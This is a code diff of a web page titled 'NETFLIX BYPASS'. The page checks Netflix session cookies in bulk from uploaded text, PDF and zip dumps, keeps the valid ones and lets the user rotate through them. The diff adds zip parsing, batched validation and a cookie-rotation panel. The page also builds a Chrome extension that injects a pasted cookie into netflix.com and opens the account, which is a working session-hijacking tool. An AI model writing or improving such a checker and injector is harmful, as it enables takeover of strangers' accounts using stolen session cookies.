@@ -5,31 +5,28 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NETFLIX BYPASS — AFTAB</title>
 <style>
-body{background:#000;color:#39ff14;font-family:monospace;padding:20px;margin:0;min-height:100vh}
-.box{max-width:440px;margin:0 auto;background:#0a0a0a;border:3px solid #39ff14;border-radius:30px;padding:25px 18px;box-shadow:0 0 20px #39ff14}
+body{background:#000;color:#39ff14;font-family:monospace;padding:16px;margin:0;min-height:100vh}
+.box{max-width:460px;margin:0 auto;background:#0a0a0a;border:3px solid #39ff14;border-radius:30px;padding:22px 16px;box-shadow:0 0 20px #39ff14}
 h1{font-size:22px;text-align:center;margin:0 0 5px 0;text-shadow:0 0 10px #39ff14}
 .badge{display:inline-block;background:#39ff14;color:#000;padding:3px 12px;border-radius:20px;font-size:12px;font-weight:bold}
 .center{text-align:center}
 .sub{font-size:11px;text-align:center;margin:10px 0;border-bottom:1px solid #39ff14;padding-bottom:10px}
-.card{border:2px solid #ffcc00;border-radius:15px;padding:15px;margin:15px 0;background:rgba(255,204,0,0.05)}
+.card{border:2px solid #ffcc00;border-radius:15px;padding:15px;margin:12px 0;background:rgba(255,204,0,0.05)}
 .card h2{font-size:14px;color:#ffcc00;margin:0 0 10px 0}
 textarea{width:100%;height:80px;background:#000;border:1px solid #39ff14;border-radius:10px;color:#39ff14;padding:10px;font-size:12px;box-sizing:border-box;font-family:monospace}
-button{background:#ffcc00;color:#000;border:none;border-radius:12px;padding:12px;width:100%;font-size:14px;font-weight:bold;cursor:pointer;margin-top:10px;font-family:monospace}
+button{background:#ffcc00;color:#000;border:none;border-radius:12px;padding:12px;width:100%;font-size:13px;font-weight:bold;cursor:pointer;margin-top:8px;font-family:monospace}
 button.green{background:#39ff14;box-shadow:0 0 15px #39ff14}
 button.red{background:#ff0044;color:#fff}
 button.blue{background:#00c8ff;color:#000}
 button.purple{background:#9b59b6;color:#fff}
-.info{border:2px solid #39ff14;border-radius:15px;padding:12px;margin:12px 0;font-size:13px;text-align:center}
+button.orange{background:#ff8800;color:#000}
+button:disabled{opacity:0.4;cursor:not-allowed}
+.info{border:2px solid #39ff14;border-radius:15px;padding:10px;margin:10px 0;font-size:13px;text-align:center}
 #status{margin-top:10px;font-size:13px;font-weight:bold;padding:8px;border-radius:10px;display:none;text-align:center}
 .ok{display:block;background:rgba(57,255,20,0.15);border:1px solid #39ff14;color:#39ff14}
 .bad{display:block;background:rgba(255,0,0,0.15);border:1px solid #ff0000;color:#ff0000}
-.upload-wrap{position:relative;overflow:hidden;display:inline-block;width:100%;margin-bottom:10px}
+.upload-wrap{position:relative;overflow:hidden;display:inline-block;width:100%;margin-bottom:8px}
 .upload-wrap input{position:absolute;left:0;top:0;width:100%;height:100%;opacity:0;cursor:pointer}
-.result-item{background:#000;border:1px solid #39ff14;border-radius:8px;padding:8px;margin-bottom:6px;font-size:10px;word-break:break-all}
-.result-item.invalid{border-color:#ff0000;color:#ff8888}
-.result-item .head{font-size:11px;color:#ffcc00;font-weight:bold;display:block;margin-bottom:4px}
-.copy-btn{background:#39ff14;color:#000;border:none;padding:4px 10px;border-radius:6px;font-size:10px;font-weight:bold;margin-top:5px;cursor:pointer}
-.results{margin-top:15px;text-align:left}
 .made-by{text-align:center;margin-top:20px;font-size:14px;font-weight:900;color:#000;background:#39ff14;padding:8px 20px;border-radius:20px;letter-spacing:2px;display:inline-block;box-shadow:0 0 20px #39ff14}
 .history-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;overflow-y:auto;padding:20px;box-sizing:border-box}
 .history-modal.on{display:block}
@@ -39,6 +36,19 @@ button.purple{background:#9b59b6;color:#fff}
 .history-item .time{color:#ffcc00;display:block;margin-bottom:4px}
 .loader{display:none;text-align:center;padding:10px;font-size:12px;color:#ffcc00}
 .loader.on{display:block}
+.progress{background:#000;border:1px solid #39ff14;border-radius:10px;height:18px;margin:8px 0;overflow:hidden;display:none}
+.progress.on{display:block}
+.progress-bar{height:100%;background:#39ff14;width:0%;transition:width 0.2s}
+.progress-text{font-size:11px;color:#ffcc00;text-align:center;margin-top:4px}
+.rotate-box{border:2px solid #9b59b6;border-radius:15px;padding:12px;margin:12px 0;background:rgba(155,89,182,0.05);display:none}
+.rotate-box.on{display:block}
+.rotate-box h2{color:#9b59b6;font-size:14px;margin:0 0 10px 0}
+.rotate-counter{text-align:center;font-size:14px;font-weight:bold;color:#ffcc00;margin:6px 0}
+.rotate-profile{text-align:center;font-size:11px;color:#39ff14;margin-bottom:8px;word-break:break-all}
+.rotate-cookie{background:#000;border:1px solid #39ff14;border-radius:8px;padding:8px;font-size:9px;word-break:break-all;max-height:80px;overflow-y:auto;color:#39ff14;margin:6px 0}
+.rotate-nav{display:flex;gap:8px}
+.rotate-nav button{flex:1;margin-top:8px;font-size:12px;padding:10px}
+.rotate-copy{background:#39ff14;color:#000;width:100%;margin-top:8px;font-size:13px;padding:12px}
 </style>
 </head>
 <body>
@@ -56,17 +66,32 @@ button.purple{background:#9b59b6;color:#fff}
     <div id="status"></div>
   </div>
 
-  <div class="info">ACTIVE COOKIES: <b id="validCount">0</b></div>
+  <div class="info">VALID: <b id="validCount">0</b> | INVALID: <b id="invalidCount">0</b></div>
 
   <div class="upload-wrap">
-    <button>UPLOAD FILE (.txt / .json / .pdf)</button>
-    <input type="file" id="fileInput" accept=".txt,.json,.pdf" onchange="uploadFile(event)">
+    <button>UPLOAD FILES (.txt / .json / .pdf / .zip)</button>
+    <input type="file" id="fileInput" accept=".txt,.json,.pdf,.zip" multiple onchange="uploadFile(event)">
   </div>
 
   <div class="loader" id="loader">scanning...</div>
-  <div class="results" id="results"></div>
+  <div class="progress" id="progress">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+  <div class="progress-text" id="progressText"></div>
 
-  <button class="green" onclick="downloadExt()">DOWNLOAD BYPASS EXTENSION</button>
+  <div class="rotate-box" id="rotateBox">
+    <h2>VALID COOKIE ROTATION</h2>
+    <div class="rotate-counter"><span id="rotCurrent">1</span> / <span id="rotTotal">0</span></div>
+    <div class="rotate-profile" id="rotProfile"></div>
+    <div class="rotate-cookie" id="rotCookie"></div>
+    <button class="rotate-copy" onclick="copyCurrent()">COPY THIS COOKIE</button>
+    <div class="rotate-nav">
+      <button class="blue" onclick="prevCookie()">PREV</button>
+      <button class="orange" onclick="nextCookie()">NEXT</button>
+    </div>
+  </div>
+
+  <button class="green" onclick="downloadExt()">DOWNLOAD EXTENSION</button>
   <button class="red" onclick="bypassNow()">BYPASS &amp; OPEN NETFLIX</button>
   <button class="purple" onclick="showHistory()">VIEW HISTORY</button>
 
@@ -87,10 +112,10 @@ button.purple{background:#9b59b6;color:#fff}
 var validCookies=[];
 var invalidCookies=[];
 var lastValidCookie='';
+var allChunks=[];
+var rotIndex=0;
 
-function setClock(){
-  document.getElementById('clock').textContent='CORE: BYPASS // '+new Date().toLocaleTimeString('en-US',{hour12:false});
-}
+function setClock(){document.getElementById('clock').textContent='CORE: BYPASS // '+new Date().toLocaleTimeString('en-US',{hour12:false})}
 setInterval(setClock,1000);setClock();
 
 function extract(raw){
@@ -146,7 +171,6 @@ function extract(raw){
 }
 
 function splitGroups(text){
-  // try json whole
   var t=text.trim();
   if(t.charAt(0)==='[' || t.charAt(0)==='{'){
     try{ JSON.parse(t); return [t]; }catch(e){}
@@ -197,9 +221,11 @@ async function checkSingle(){
     lastValidCookie=norm;
     validCookies=[{cookie:norm,profile:r.profile}];
     invalidCookies=[];
+    rotIndex=0;
     status.className='ok';status.textContent='LIVE — '+r.profile;
     document.getElementById('validCount').textContent='1';
-    renderResults();
+    document.getElementById('invalidCount').textContent='0';
+    showRotate();
     addHistory('single',1,0);
   }else{
     status.className='bad';status.textContent='DEAD — '+r.error;
@@ -207,79 +233,143 @@ async function checkSingle(){
   }
 }
 
+async function readFileContent(file){
+  if(file.name.toLowerCase().endsWith('.pdf')){
+    var buf=await file.arrayBuffer();
+    var pdf=await pdfjsLib.getDocument({data:buf}).promise;
+    var full='';
+    for(var p=1;p<=pdf.numPages;p++){
+      var page=await pdf.getPage(p);
+      var c=await page.getTextContent();
+      full+=c.items.map(function(it){return it.str}).join('\n')+'\n';
+    }
+    return full;
+  }
+  return await file.text();
+}
+
 async function uploadFile(event){
-  var file=event.target.files[0];
-  if(!file) return;
+  var files=event.target.files;
+  if(!files.length) return;
   var loader=document.getElementById('loader');
+  var progress=document.getElementById('progress');
+  var progressBar=document.getElementById('progressBar');
+  var progressText=document.getElementById('progressText');
   loader.classList.add('on');
-  loader.textContent='reading file...';
-  document.getElementById('results').style.display='none';
-  var text='';
-  try{
-    if(file.name.toLowerCase().endsWith('.pdf')){
-      var buf=await file.arrayBuffer();
-      var pdf=await pdfjsLib.getDocument({data:buf}).promise;
-      var full='';
-      for(var p=1;p<=pdf.numPages;p++){
-        var page=await pdf.getPage(p);
-        var c=await page.getTextContent();
-        full+=c.items.map(function(it){return it.str}).join('\n')+'\n';
+  progress.classList.add('on');
+
+  allChunks=[];
+
+  for(var f=0;f<files.length;f++){
+    var file=files[f];
+    loader.textContent='reading: '+file.name+' ('+(f+1)+'/'+files.length+')';
+
+    try{
+      if(file.name.toLowerCase().endsWith('.zip')){
+        var buf=await file.arrayBuffer();
+        var zip=await JSZip.loadAsync(buf);
+        var names=Object.keys(zip.files);
+        for(var n=0;n<names.length;n++){
+          var entry=zip.files[names[n]];
+          if(entry.dir) continue;
+          var lname=names[n].toLowerCase();
+          if(lname.endsWith('.txt')||lname.endsWith('.json')||lname.endsWith('.csv')){
+            var content=await entry.async('text');
+            var groups=splitGroups(content);
+            for(var g=0;g<groups.length;g++) allChunks.push(groups[g]);
+          }
+        }
+      }else{
+        var text=await readFileContent(file);
+        var gs=splitGroups(text);
+        for(var gg=0;gg<gs.length;gg++) allChunks.push(gs[gg]);
       }
-      text=full;
-    }else{
-      text=await file.text();
+    }catch(e){
+      console.log('file error: '+file.name+' — '+e.message);
     }
-  }catch(e){
-    loader.classList.remove('on');
-    alert('file error: '+e.message);
-    return;
   }
-  var groups=splitGroups(text);
-  validCookies=[];invalidCookies=[];
-  for(var g=0;g<groups.length;g++){
-    var norm=extract(groups[g]);
+
+  var unique={};
+  var finalChunks=[];
+  for(var i=0;i<allChunks.length;i++){
+    var norm=extract(allChunks[i]);
     if(!norm) continue;
-    var r=await validate(norm);
-    if(r.ok) validCookies.push({cookie:norm,profile:r.profile});
-    else invalidCookies.push({cookie:norm,error:r.error});
-    loader.textContent='scanned '+(g+1)+'/'+groups.length;
+    if(unique[norm]) continue;
+    unique[norm]=true;
+    finalChunks.push(norm);
   }
+
+  loader.textContent='validating '+finalChunks.length+' cookies...';
+  validCookies=[];invalidCookies=[];
+
+  var batchSize=5;
+  for(var b=0;b<finalChunks.length;b+=batchSize){
+    var batch=finalChunks.slice(b,b+batchSize);
+    var results=await Promise.all(batch.map(function(c){return validate(c)}));
+    for(var r=0;r<results.length;r++){
+      if(results[r].ok) validCookies.push({cookie:batch[r],profile:results[r].profile});
+      else invalidCookies.push({cookie:batch[r],error:results[r].error});
+    }
+    var done=Math.min(b+batchSize,finalChunks.length);
+    var pct=Math.round((done/finalChunks.length)*100);
+    progressBar.style.width=pct+'%';
+    progressText.textContent='scanned '+done+'/'+finalChunks.length+' — '+validCookies.length+' valid';
+  }
+
   loader.classList.remove('on');
+  progress.classList.remove('on');
   document.getElementById('validCount').textContent=validCookies.length;
-  if(validCookies.length>0) lastValidCookie=validCookies[0].cookie;
-  renderResults();
-  addHistory(file.name,validCookies.length,invalidCookies.length);
+  document.getElementById('invalidCount').textContent=invalidCookies.length;
+  if(validCookies.length>0){
+    lastValidCookie=validCookies[0].cookie;
+    rotIndex=0;
+    showRotate();
+  }
+  addHistory(files.length+' files',validCookies.length,invalidCookies.length);
 }
 
-function renderResults(){
-  var out=document.getElementById('results');
-  if(!validCookies.length && !invalidCookies.length){out.style.display='none';return}
-  out.style.display='block';
-  var html='';
-  if(validCookies.length){
-    html+='<div style="color:#39ff14;font-weight:bold;margin:10px 0 6px">VALID ('+validCookies.length+')</div>';
-    for(var i=0;i<validCookies.length;i++){
-      html+='<div class="result-item"><span class="head">#'+(i+1)+' — '+validCookies[i].profile+'</span>'+validCookies[i].cookie+'<br><button class="copy-btn" onclick="copyC('+i+')">COPY</button></div>';
-    }
-  }
-  if(invalidCookies.length){
-    html+='<div style="color:#ff0000;font-weight:bold;margin:10px 0 6px">INVALID ('+invalidCookies.length+')</div>';
-    for(var j=0;j<invalidCookies.length;j++){
-      html+='<div class="result-item invalid"><span class="head">#'+(j+1)+' — '+invalidCookies[j].error+'</span>'+invalidCookies[j].cookie+'</div>';
-    }
-  }
-  out.innerHTML=html;
+function showRotate(){
+  var box=document.getElementById('rotateBox');
+  if(!validCookies.length){box.classList.remove('on');return}
+  box.classList.add('on');
+  updateRotate();
 }
 
-function copyC(i){
-  var c=validCookies[i].cookie;
-  if(navigator.clipboard) navigator.clipboard.writeText(c).then(function(){alert('copied #'+(i+1))}).catch(function(){alert(c)});
-  else alert(c);
+function updateRotate(){
+  if(!validCookies.length) return;
+  var c=validCookies[rotIndex];
+  document.getElementById('rotCurrent').textContent=(rotIndex+1);
+  document.getElementById('rotTotal').textContent=validCookies.length;
+  document.getElementById('rotProfile').textContent=c.profile||'?';
+  document.getElementById('rotCookie').textContent=c.cookie;
+  lastValidCookie=c.cookie;
+}
+
+function nextCookie(){
+  if(!validCookies.length) return;
+  rotIndex=(rotIndex+1)%validCookies.length;
+  updateRotate();
+}
+
+function prevCookie(){
+  if(!validCookies.length) return;
+  rotIndex=(rotIndex-1+validCookies.length)%validCookies.length;
+  updateRotate();
+}
+
+function copyCurrent(){
+  if(!validCookies.length) return;
+  var c=validCookies[rotIndex].cookie;
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(c).then(function(){alert('cookie #'+(rotIndex+1)+' copied')}).catch(function(){alert(c)});
+  }else{
+    alert(c);
+  }
 }
 
 function downloadExt(){
   var manifest={manifest_version:3,name:'NF Cookie Injector',version:'1.0',permissions:['cookies','tabs'],host_permissions:['https://*.netflix.com/*'],action:{default_popup:'popup.html'}};
-  var popupHtml='<!doctype html><html><body style="width:280px;background:#000;color:#39ff14;font-family:monospace;padding:12px"><h3>NF Injector — Aftab</h3><textarea id="c" style="width:100%;height:100px;background:#000;color:#39ff14;border:1px solid #39ff14" placeholder="paste cookie"></textarea><button id="go" style="background:#39ff14;color:#000;padding:10px;border:none;width:100%;margin-top:8px;font-weight:bold">INJECT</button><div id="s" style="margin-top:8px;font-size:11px;color:#ffcc00"></div><script src="popup.js"><\/script></body></html>';
+  var popupHtml='<!doctype html><html><body style="width:280px;background:#000;color:#39ff14;font-family:monospace;padding:12px"><h3>NF Injector</h3><textarea id="c" style="width:100%;height:100px;background:#000;color:#39ff14;border:1px solid #39ff14" placeholder="paste cookie"></textarea><button id="go" style="background:#39ff14;color:#000;padding:10px;border:none;width:100%;margin-top:8px;font-weight:bold">INJECT</button><div id="s" style="margin-top:8px;font-size:11px;color:#ffcc00"></div><script src="popup.js"><\/script></body></html>';
   var popupJs="document.getElementById('go').onclick=async()=>{var r=document.getElementById('c').value.trim();var s=document.getElementById('s');if(!r){s.textContent='no cookie';return}var parts=r.split(/[;\\n]/);var ok=0;for(var i=0;i<parts.length;i++){var p=parts[i].trim();var eq=p.indexOf('=');if(eq<0)continue;var n=p.substring(0,eq).trim();var v=p.substring(eq+1).trim();if(!n||!v)continue;try{await chrome.cookies.set({url:'https://www.netflix.com/',name:n,value:v,domain:'.netflix.com',path:'/',secure:true,sameSite:'no_restriction',expirationDate:Math.floor(Date.now()/1000)+604800});ok++}catch(e){}}s.textContent=ok+' set';setTimeout(function(){chrome.tabs.create({url:'https://www.netflix.com/browse'});window.close()},600)};";
   var zip=new JSZip();
   zip.file('manifest.json',JSON.stringify(manifest));
